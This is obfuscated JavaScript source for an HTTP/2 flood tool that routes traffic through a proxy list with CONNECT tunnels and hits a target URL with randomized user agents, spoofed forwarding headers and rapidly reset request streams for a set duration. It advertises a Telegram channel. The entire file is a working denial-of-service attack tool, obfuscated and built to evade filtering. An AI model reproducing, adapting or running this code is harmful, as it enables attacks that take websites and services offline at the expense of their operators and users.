lang_header = [_0x38af('‫4f'), _0x38af('‫50'), _0x38af('‫51'), _0x38af('‫52'), _0x38af('‮53'), _0x38af('‫54'), _0x38af('‮55'), _0x38af('‫56'), 'en-GB,en;q=0.5', _0x38af('‫57'), _0x38af('‮58'), _0x38af('‫59'), _0x38af('‫5a'), _0x38af('‫5b'), 'en-IN', 'en-PH', 'en-SG', _0x38af('‫5c'), _0x38af('‫5d'), 'en-GB,en;q=0.9', _0x38af('‮5e'), '*', _0x38af('‮5f'), 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5', _0x38af('‮60'), _0x38af('‫61'), 'en-GB, en-US, en;q=0.9', _0x38af('‫62'), 'cs;q=0.5', _0x38af('‮63'), _0x38af('‫64'), _0x38af('‫65'), 'de-CH;q=0.7', 'tr', 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'];
const encoding_header = ['*', '*/*', _0x38af('‫66'), _0x38af('‫67'), 'compress, gzip', _0x38af('‫68'), _0x38af('‮69'), 'gzip, deflate', 'br', _0x38af('‫6a'), _0x38af('‫6b'), 'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25', _0x38af('‫6c'), _0x38af('‮6d'), _0x38af('‮6e'), 'compress, deflate', 'compress', _0x38af('‫67'), _0x38af('‮6f'), _0x38af('‮70'), 'deflate'];
const control_header = [_0x38af('‫71'), _0x38af('‮72'), 'public, max-age=0', _0x38af('‮73'), _0x38af('‮74'), 's-maxage=604800', _0x38af('‫75'), 'public, immutable, max-age=31536000', _0x38af('‮76'), _0x38af('‮77'), _0x38af('‮78'), _0x38af('‮79'), _0x38af('‫7a'), 'private', 'public', _0x38af('‮7b'), _0x38af('‫7c'), _0x38af('‮7d'), 'max-age=2592000', _0x38af('‮7e'), _0x38af('‮7f'), _0x38af('‫80'), 'stale-if-error', 'only-if-cached', _0x38af('‮81')];
const uap = [_0x38af('‫82'), _0x38af('‫83'), _0x38af('‫84'), _0x38af('‫85'), _0x38af('‫86'), _0x38af('‮87'), _0x38af('‫88'), _0x38af('‫89'), _0x38af('‫8a'), _0x38af('‮8b'), _0x38af('‮8c'), _0x38af('‫8d'), 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', _0x38af('‫8e'), _0x38af('‫8f'), _0x38af('‮90'), _0x38af('‫91'), 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0', _0x38af('‫92'), _0x38af('‫93'), _0x38af('‫94'), 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', _0x38af('‮95'), 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', _0x38af('‫96'), _0x38af('‮97'), 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', _0x38af('‫98')];
const tips1 = [_0x38af('‮99'), _0x38af('‫9a'), _0x38af('‮9b'), _0x38af('‮9c'), 'My channel: https://t.me/SaturnSpark'];
const platformd = ['Windows', 'Linux', 'Android', 'iOS', _0x38af('‫9d'), _0x38af('‫9e'), _0x38af('‮9f'), 'Firefox OS'];
const rdom2 = ['hello server', _0x38af('‮a0'), _0x38af('‫a1'), _0x38af('‫a2'), _0x38af('‫a3'), _0x38af('‮a4'), _0x38af('‮a5')];
var cipper = cplist[Math[_0x38af('‫1f')](Math['floor'](Math[_0x38af('‫24')]() * cplist[_0x38af('‮a')]))];
var random = rdom2[Math[_0x38af('‫1f')](Math[_0x38af('‫1f')](Math['random']() * rdom2[_0x38af('‮a')]))];
var platformx = platformd[Math[_0x38af('‫1f')](Math['floor'](Math[_0x38af('‫24')]() * platformd[_0x38af('‮a')]))];
var tipsz = tips1[Math['floor'](Math[_0x38af('‫1f')](Math[_0x38af('‫24')]() * tips1[_0x38af('‮a')]))];
var siga = sig[Math[_0x38af('‫1f')](Math[_0x38af('‫1f')](Math[_0x38af('‫24')]() * sig[_0x38af('‮a')]))];
var uap1 = uap[Math[_0x38af('‫1f')](Math['floor'](Math[_0x38af('‫24')]() * uap[_0x38af('‮a')]))];
var accept = accept_header[Math['floor'](Math[_0x38af('‫1f')](Math['random']() * accept_header[_0x38af('‮a')]))];
var lang = lang_header[Math[_0x38af('‫1f')](Math[_0x38af('‫1f')](Math[_0x38af('‫24')]() * lang_header['length']))];
var encoding = encoding_header[Math[_0x38af('‫1f')](Math['floor'](Math[_0x38af('‫24')]() * encoding_header[_0x38af('‮a')]))];
var control = control_header[Math['floor'](Math[_0x38af('‫1f')](Math['random']() * control_header[_0x38af('‮a')]))];
var proxies = readLines(args[_0x38af('‮a6')]);
const parsedTarget = url[_0x38af('‫a7')](args[_0x38af('‫a8')]);
const rateHeaders = [{
    'A-IM': _0x38af('‮a9')
}, {
    'accept': accept
}, {
    'accept-charset': accept
}, {
    'accept-datetime': accept
}, {
    'upgrade-insecure-requests': '1'
}, {
    'Access-Control-Request-Method': _0x38af('‮aa')
}, {
    'Cache-Control': 'no-cache'
}, {
    'Content-Encoding': _0x38af('‫66')
}, {
    'content-type': 'text/html'
}];
const rateHeaders2 = [{
    'X-Requested-With': 'XMLHttpRequest'
}, {
    'X-Forwarded-For': spoofed
}, {
    'X-Vercel-Cache': randstr(0xf)
}, {
    'Alt-Svc': _0x38af('‫ab') + parsedTarget[_0x38af('‮ac')] + _0x38af('‫ad')
}, {
    'TK': '?'
}, {
    'X-Frame-Options': 'deny'
}, {
    'X-ASP-NET': randstr(0x19)
}];
const rateHeaders3 = [{
    'cookie': randstr(0xf)
}, {
    'Expect': _0x38af('‮ae')
}, {
    'Forwarded': _0x38af('‫af') + spoofed
}, {
    'From': _0x38af('‮b0')
}, {
    'Max-Forwards': '10'
}, {
    'origin': _0x38af('‮b1') + parsedTarget[_0x38af('‮ac')]
}, {
    'pragma': _0x38af('‫7c')
}, {
    'referer': _0x38af('‮b1') + parsedTarget[_0x38af('‮ac')] + '/'
}];
const rateHeaders4 = [{
    'accept-encoding': encoding
}, {
    'accept-language': lang
}, {
    'Refresh': '5'
}, {
    'X-Content-duration': spoofed
}, {
    'service-worker-navigation-preload': Math['random']() < 0.5 ? _0x38af('‮b2') : 'null'
}];
if (cluster[_0x38af('‫b3')]) {
    console[_0x38af('‫28')]();
    console[_0x38af('‮b')](_0x38af('‮29')[_0x38af('‮2a')]);
    console[_0x38af('‮b')](_0x38af('‫2b')[_0x38af('‫33')]);
    console['log']('Target: ' [_0x38af('‫2f')] + process[_0x38af('‫2e')][0x2]);
    console[_0x38af('‮b')](_0x38af('‫b4')[_0x38af('‫2f')] + process[_0x38af('‫2e')][0x3]);
    console[_0x38af('‮b')](_0x38af('‮30')[_0x38af('‫2f')] + process[_0x38af('‫2e')][0x4]);
    console[_0x38af('‮b')](_0x38af('‮31')[_0x38af('‫2f')] + process[_0x38af('‫2e')][0x5]);
    console['log']('ProxyFile: ' [_0x38af('‫2f')] + process[_0x38af('‫2e')][0x6]);
    console['log'](_0x38af('‫2b')['gray']);
    console[_0x38af('‮b')](_0x38af('‫34')['brightCyan'] + tipsz);
    for (let counter = 0x1; counter <= args[_0x38af('‮36')]; counter++) {
        cluster[_0x38af('‮b5')]();
    }
} else {
    setInterval(runFlooder);
}
class NetSocket {
    constructor() {}
    async [_0x38af('‮b6')](_0x49adba, _0x17a06d) {
        var _0x1b2628 = {
            'CwsDj': 'utf-8',
            'QneWZ': function (_0x58d77a, _0x3c92ef) {
                return _0x58d77a === _0x3c92ef;
            },
            'OckWB': function (_0x473d96, _0x25d78c, _0x991469) {
                return _0x473d96(_0x25d78c, _0x991469);
            },
            'WkMnD': function (_0x58495e, _0x406770) {
                return _0x58495e === _0x406770;
            },
            'zXpaA': 'PSAfl',
            'RZuOz': _0x38af('‫b7'),
            'NnCTt': _0x38af('‮b8'),
            'kLeTq': _0x38af('‫b9'),
            'TYgFh': _0x38af('‮ba'),
            'LnyQC': function (_0x2a6c25, _0x27b72e) {
                return _0x2a6c25 + _0x27b72e;
            },
            'KHxeW': _0x38af('‫bb'),
            'iRRVr': function (_0x29fd09, _0xe1d34d) {
                return _0x29fd09 + _0xe1d34d;
            },
            'LDFgW': function (_0x3ef35e, _0x1e587e) {
                return _0x3ef35e + _0x1e587e;
            },
            'JSdoM': _0x38af('‮bc'),
            'Zqiko': _0x38af('‫bd'),
            'bGuMF': ':443\x0d\x0aConnection: Keep-Alive\x0d\x0a\x0d\x0a',
            'QDgXn': function (_0x4fb31d, _0x52d8a1) {
                return _0x4fb31d * _0x52d8a1;
            },
            'ndOJm': _0x38af('‫be'),
            'qvVFe': 'data',
            'OyWsU': _0x38af('‮bf'),
            'qDKKJ': _0x38af('‮c0')
        };
        const _0x169cf2 = _0x49adba['address'][_0x38af('‫11')](':');
        const _0x389b4c = _0x169cf2[0x0];
        const _0x283c7a = _0x1b2628[_0x38af('‫c1')](_0x1b2628[_0x38af('‫c2')](_0x1b2628[_0x38af('‫c3')](_0x1b2628[_0x38af('‫c3')](_0x1b2628[_0x38af('‮c4')], _0x49adba[_0x38af('‮c5')]), _0x1b2628['Zqiko']), _0x49adba[_0x38af('‮c5')]), _0x1b2628['bGuMF']);
        const _0x55541d = new Buffer[(_0x38af('‫c6'))](_0x283c7a);
        const _0x5920ff = await net[_0x38af('‫be')]({
            'host': _0x49adba[_0x38af('‮ac')],
            'port': _0x49adba['port']
        });
        _0x5920ff[_0x38af('‫c7')](_0x1b2628[_0x38af('‮c8')](_0x49adba[_0x38af('‮bf')], 0x927c0));
        _0x5920ff[_0x38af('‮c9')](!![], 0x186a0);
        _0x5920ff['on'](_0x1b2628[_0x38af('‮ca')], () => {
            _0x5920ff[_0x38af('‮1a')](_0x55541d);
        });
        _0x5920ff['on'](_0x1b2628['qvVFe'], _0x33c136 => {
            var _0x3872bb = {
                'VCNoQ': _0x1b2628[_0x38af('‫cb')],
                'BSnNw': function (_0x3275ac, _0x5b8248) {
                    return _0x1b2628[_0x38af('‮cc')](_0x3275ac, _0x5b8248);
                },
                'epgIA': _0x38af('‮b8'),
                'fcBQs': function (_0x236ae5, _0x5940d7, _0x1d631d) {
                    return _0x1b2628[_0x38af('‫cd')](_0x236ae5, _0x5940d7, _0x1d631d);
                }
            };
            if (_0x1b2628[_0x38af('‫ce')](_0x38af('‫cf'), _0x1b2628[_0x38af('‮d0')])) {
                const _0x3d7d8a = _0x33c136[_0x38af('‫10')](_0x3872bb[_0x38af('‮d1')]);
                const _0x24f5d0 = _0x3d7d8a[_0x38af('‫d2')]('HTTP/1.1 200');
                if (_0x3872bb[_0x38af('‮d3')](_0x24f5d0, ![])) {
                    _0x5920ff['destroy']();
                    return _0x17a06d(undefined, _0x3872bb['epgIA']);
                }
                return _0x3872bb[_0x38af('‮d4')](_0x17a06d, _0x5920ff, undefined);
            } else {
                const _0x128b34 = _0x33c136[_0x38af('‫10')](_0x38af('‫e'));
                const _0x91d21a = _0x128b34[_0x38af('‫d2')](_0x1b2628[_0x38af('‮d5')]);
                if (_0x1b2628[_0x38af('‫ce')](_0x91d21a, ![])) {
                    _0x5920ff[_0x38af('‫1c')]();
                    return _0x1b2628[_0x38af('‫cd')](_0x17a06d, undefined, _0x1b2628['NnCTt']);
                }
                return _0x1b2628['OckWB'](_0x17a06d, _0x5920ff, undefined);
            }
        });
        _0x5920ff['on'](_0x1b2628[_0x38af('‮d6')], () => {
            _0x5920ff[_0x38af('‫1c')]();
            return _0x17a06d(undefined, _0x1b2628[_0x38af('‫d7')]);
        });
        _0x5920ff['on'](_0x1b2628[_0x38af('‮d8')], _0x3c5c8b => {
            if (_0x38af('‫d9') === _0x1b2628[_0x38af('‮da')]) {
                return elements[_0x1b2628[_0x38af('‫cd')](randomIntn, 0x0, elements[_0x38af('‮a')])];
            } else {
                _0x5920ff['destroy']();
                return _0x1b2628['OckWB'](_0x17a06d, undefined, _0x1b2628[_0x38af('‫c1')](_0x1b2628[_0x38af('‮db')], _0x3c5c8b));
            }
        });
    }
}
const path = parsedTarget[_0x38af('‫dc')][_0x38af('‫dd')](/%RAND%/, () => Array[_0x38af('‫c6')]({
    'length': 0x10
}, () => Math[_0x38af('‫1f')](Math[_0x38af('‫24')]() * 0x24)[_0x38af('‫10')](0x24))[_0x38af('‫3e')](''));
const Socker = new NetSocket();
headers[_0x38af('‫de')] = _0x38af('‮aa');
headers[':authority'] = parsedTarget[_0x38af('‮ac')];
headers[_0x38af('‮df')] = path;
headers[_0x38af('‫e0')] = _0x38af('‫e1');
headers['x-forwarded-proto'] = _0x38af('‫e1');

function runFlooder() {
    var _0x1854b4 = {
        'AZElF': _0x38af('‮e2'),
        'QKEGD': function (_0x539a7c, _0x2ffb2a) {
            return _0x539a7c + _0x2ffb2a;
        },
        'YZpPd': function (_0x32cd01, _0x41ddf0) {
            return _0x32cd01(_0x41ddf0);
        },
        'Arqeq': _0x38af('‫e3'),
        'qGTgB': _0x38af('‮e4'),
        'UOHPT': function (_0x31de11, _0x3399d3) {
            return _0x31de11 * _0x3399d3;
        },
        'DJegV': '3|1|4|0|2',
        'MHGCN': _0x38af('‮e5'),
        'KRBVu': _0x38af('‫e6'),
        'dDTLK': _0x38af('‮e7'),
        'gCUdb': function (_0x23b2d5, _0x3c7423) {
            return _0x23b2d5 < _0x3c7423;
        },
        'CETsO': _0x38af('‫be'),
        'ZQicQ': _0x38af('‫1b')
    };
    const _0xb62986 = randomElement(proxies);
    const _0x572099 = _0xb62986[_0x38af('‫11')](':');
    const _0x483285 = {
        'host': _0x572099[0x0],
        'port': ~~_0x572099[0x1],
        'address': _0x1854b4[_0x38af('‮e8')](parsedTarget[_0x38af('‮ac')], _0x38af('‮e9')),
        'timeout': 0x64
    };
    Socker[_0x38af('‮b6')](_0x483285, async (_0x414792, _0x26d029) => {
            var _0x2d3e9f = {
                'HhjdK': _0x1854b4['AZElF'],
                'CQibs': function (_0x24b1d0, _0x40b3e7) {
                    return _0x24b1d0 * _0x40b3e7;
                },
                'dzioG': function (_0x27e9e6, _0x8e058f) {
                    return _0x1854b4[_0x38af('‮e8')](_0x27e9e6, _0x8e058f);
                },
                'KPjCr': function (_0xdf50aa, _0x49adec) {
                    return _0x1854b4['YZpPd'](_0xdf50aa, _0x49adec);
                },
                'tIlpL': _0x1854b4[_0x38af('‫ea')],
                'DRObx': _0x38af('‮eb'),
                'xJslU': _0x1854b4[_0x38af('‮ec')],
                'JGwQk': function (_0x165aac, _0x204b64) {
                    return _0x1854b4[_0x38af('‮ed')](_0x165aac, _0x204b64);
                },
                'yAPyL': _0x1854b4['DJegV'],
                'avvoj': function (_0x4746c3, _0x31f17a) {
                    return _0x4746c3 < _0x31f17a;
                },
                'fAwgT': function (_0x1f1ffa, _0x32a509) {
                    return _0x1854b4[_0x38af('‮ed')](_0x1f1ffa, _0x32a509);
                },
                'eWlsd': _0x1854b4['MHGCN']
            };
            if (_0x26d029) return;
            _0x414792['setKeepAlive'](!![], 0x927c0);
            const _0x488b5a = {
                'rejectUnauthorized': ![],
                'host': parsedTarget[_0x38af('‮ac')],
                'servername': parsedTarget[_0x38af('‮ac')],
                'socket': _0x414792,
                'ecdhCurve': _0x1854b4[_0x38af('‮ee')],
                'ciphers': cipper,
                'secureProtocol': _0x1854b4['dDTLK'],
                'ALPNProtocols': ['h2']
            };
            const _0x2c6557 = await tls[_0x38af('‫be')](0x1bb, parsedTarget['host'], _0x488b5a);
            _0x2c6557[_0x38af('‮c9')](!![], 0xea60);
            const _0x4d9677 = await http2[_0x38af('‫be')](parsedTarget[_0x38af('‮ef')], {
                'protocol': _0x38af('‫f0'),
                'settings': {
                    'headerTableSize': 0x1000,
                    'maxConcurrentStreams': 0x3e8,
                    'initialWindowSize': _0x1854b4[_0x38af('‮f1')](Math[_0x38af('‫24')](), 0.5) ? 0x10000 : 0xffff,
                    'maxHeaderListSize': 0x2000,
                    'maxFrameSize': Math[_0x38af('‫24')]() < 0.5 ? 0xffffff : 0x4000,
                    'enablePush': ![]
                },
                'maxSessionMemory': 0xd05,
                'maxDeflateDynamicTableSize': 0xffffffff,
                'createConnection': () => _0x2c6557,
                'socket': _0x414792
            });
            _0x4d9677['settings']({
                'headerTableSize': 0x1000,
                'maxConcurrentStreams': 0x3e8,
                'initialWindowSize': _0x1854b4[_0x38af('‮f1')](Math[_0x38af('‫24')](), 0.5) ? 0x10000 : 0xffff,
                'maxHeaderListSize': 0x2000,
                'maxFrameSize': Math['random']() < 0.5 ? 0xffffff : 0x4000,
                'enablePush': ![]
            });
            _0x4d9677['on'](_0x1854b4[_0x38af('‫f2')], () => {
                var _0x215550 = {
                    'KYjLV': function (_0x1039df, _0x5c519b) {
                        return _0x2d3e9f['JGwQk'](_0x1039df, _0x5c519b);
                    },
                    'phZFQ': 'jLtmk',
                    'knUIO': _0x2d3e9f[_0x38af('‮f3')]
                };
                const _0x1d2b5c = setInterval(() => {
                    if (_0x2d3e9f[_0x38af('‫f4')] !== _0x2d3e9f[_0x38af('‫f4')]) {
                        cluster[_0x38af('‮b5')]();
                    } else {
                        const _0x105125 = {
                            ...headers,
                            ...rateHeaders[Math[_0x38af('‫1f')](Math['random']() * rateHeaders[_0x38af('‮a')])],
                            ...rateHeaders4[Math[_0x38af('‫1f')](_0x2d3e9f['CQibs'](Math[_0x38af('‫24')](), rateHeaders4[_0x38af('‮a')]))],
                            ...rateHeaders3[Math['floor'](Math[_0x38af('‫24')]() * rateHeaders3[_0x38af('‮a')])],
                            'user-agent': _0x2d3e9f['dzioG'](uap1, _0x2d3e9f[_0x38af('‮f5')](randstr, 0x6)),
                            ...rateHeaders2[Math[_0x38af('‫1f')](Math[_0x38af('‫24')]() * rateHeaders2['length'])]
                        };
                        for (let _0x12a5b0 = 0x0; _0x12a5b0 < args['Rate']; _0x12a5b0++) {
                            if (_0x2d3e9f[_0x38af('‫f6')] !== _0x2d3e9f[_0x38af('‮f7')]) {
                                const _0x1be0a4 = _0x4d9677[_0x38af('‮f8')](_0x105125);
                                _0x4d9677['on'](_0x2d3e9f[_0x38af('‮f9')], _0x528c96 => {
                                    var _0x46cc96 = {
                                        'XINln': function (_0x4a3a8b, _0x34bb40) {
                                            return _0x215550[_0x38af('‮fa')](_0x4a3a8b, _0x34bb40);
                                        },
                                        'VHAWN': function (_0x5c4221, _0x3c43a8) {
                                            return _0x5c4221 < _0x3c43a8;
                                        }
                                    };
                                    if (_0x215550[_0x38af('‮fb')] !== _0x38af('‫fc')) {
                                        const _0x5b88c3 = {
                                            ...headers,
                                            ...rateHeaders[Math['floor'](_0x46cc96['XINln'](Math[_0x38af('‫24')](), rateHeaders['length']))],
                                            ...rateHeaders4[Math[_0x38af('‫1f')](Math['random']() * rateHeaders4['length'])],
                                            ...rateHeaders3[Math['floor'](_0x46cc96[_0x38af('‮fd')](Math[_0x38af('‫24')](), rateHeaders3[_0x38af('‮a')]))],
                                            'user-agent': uap1 + randstr(0x6),
                                            ...rateHeaders2[Math[_0x38af('‫1f')](Math['random']() * rateHeaders2[_0x38af('‮a')])]
                                        };
                                        for (let _0x159d63 = 0x0; _0x46cc96['VHAWN'](_0x159d63, args[_0x38af('‮fe')]); _0x159d63++) {
                                            const _0x55904a = _0x4d9677[_0x38af('‮f8')](_0x5b88c3);
                                            _0x4d9677['on'](_0x38af('‮e4'), _0x5a9de4 => {
                                                var _0x505f59 = '4|3|1|0|2' [_0x38af('‫11')]('|'),
                                                    _0x4d7f35 = 0x0;
                                                while (!![]) {
                                                    switch (_0x505f59[_0x4d7f35++]) {
                                                    case '0':
                                                        _0x55904a[_0x38af('‫1c')]();
                                                        continue;
                                                    case '1':
                                                        _0x55904a[_0x38af('‫1b')]();
                                                        continue;
                                                    case '2':
                                                        return;
                                                    case '3':
                                                        _0x55904a[_0x38af('‮1a')](random);
                                                        continue;
                                                    case '4':
                                                        _0x55904a['rstStream'](http2[_0x38af('‫ff')][_0x38af('‮100')]);
                                                        continue;
                                                    }
                                                    break;
                                                }
                                            });
                                            _0x55904a['end']();
                                        }
                                    } else {
                                        var _0x594b30 = _0x215550['knUIO'][_0x38af('‫11')]('|'),
                                            _0xcca57 = 0x0;
                                        while (!![]) {
                                            switch (_0x594b30[_0xcca57++]) {
                                            case '0':
                                                _0x1be0a4['destroy']();
                                                continue;
                                            case '1':
                                                _0x1be0a4[_0x38af('‮1a')](random);
                                                continue;
                                            case '2':
                                                return;
                                            case '3':
                                                _0x1be0a4['rstStream'](http2['constants'][_0x38af('‮100')]);
                                                continue;
                                            case '4':
                                                _0x1be0a4[_0x38af('‫1b')]();
                                                continue;
                                            }
                                            break;
                                        }
                                    }
                                });
                                _0x1be0a4[_0x38af('‮101')]();
                            } else {
                                return fs[_0x38af('‮102')](filePath, 'utf-8')[_0x38af('‫10')]()[_0x38af('‫11')](/\r?\n/);
                            }
                        }
                    }
                }, 0x3e8);
            });
            _0x4d9677['on'](_0x1854b4[_0x38af('‫103')], () => {
                var _0x42b088 = {
                    'LYlTY': function (_0xdd58c, _0x437800) {
                        return _0x2d3e9f[_0x38af('‮104')](_0xdd58c, _0x437800);
                    },
                    'dkBNA': function (_0x32378b, _0x56d674) {
                        return _0x2d3e9f[_0x38af('‫105')](_0x32378b, _0x56d674);
                    }
                };
                if (_0x2d3e9f[_0x38af('‫106')] !== 'vnZId') {
                    const _0x32793c = _0x38af('‮107');
                    let _0x4f0a11 = '';
                    const _0x40d352 = _0x32793c[_0x38af('‮a')];
                    for (let _0x20b360 = 0x0; _0x42b088['LYlTY'](_0x20b360, length); _0x20b360++) {
                        _0x4f0a11 += _0x32793c[_0x38af('‮1d')](Math['floor'](_0x42b088[_0x38af('‮108')](Math[_0x38af('‫24')](), _0x40d352)));
                    }
                    return _0x4f0a11;
                } else {
                    _0x4d9677['destroy']();
                    _0x414792[_0x38af('‫1c')]();
                    return;
                }
            });
        }),
        function (_0x2e242d, _0x1b9088, _0x47c277) {};
}
const KillScript = () => process['exit'](0x1);
setTimeout(KillScript, args[_0x38af('‫109')] * 0x3e8);;
_0xodH = 'jsjiami.com.v6';